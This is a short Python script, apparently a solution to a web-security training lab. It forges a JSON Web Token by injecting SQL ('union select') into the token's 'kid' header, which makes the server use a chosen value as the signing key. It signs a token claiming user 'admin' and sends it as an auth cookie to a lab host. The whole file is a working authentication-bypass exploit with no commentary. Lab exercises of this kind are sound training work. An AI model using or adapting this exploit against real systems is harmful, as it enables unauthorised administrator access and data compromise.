import hmac
import base64
import hashlib
import json
import requests

header = {"typ":"JWT","alg":"HS256","kid":"AAAA' union select 'TEST"}
key = "TEST"
payload = {"user":"admin"}
str = base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='utf8')).decode('utf8').rstrip("=")+'.'+base64.urlsafe_b64encode(bytes(json.dumps(payload),encoding='utf8')).decode('utf8').rstrip("=")
sig = base64.urlsafe_b64encode(hmac.new(bytes(key,encoding='utf8'),str.encode('utf8'),hashlib.sha256).digest()).decode('utf8').rstrip("=")
final = str+"."+sig
print(final)

r = requests.Session()
host = "http://ptl-a0a8af23-66e6fe11.libcurl.so"
cookie = "auth="+final
head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Cookie': cookie}
r = requests.get(host,headers=head)
print(r.text)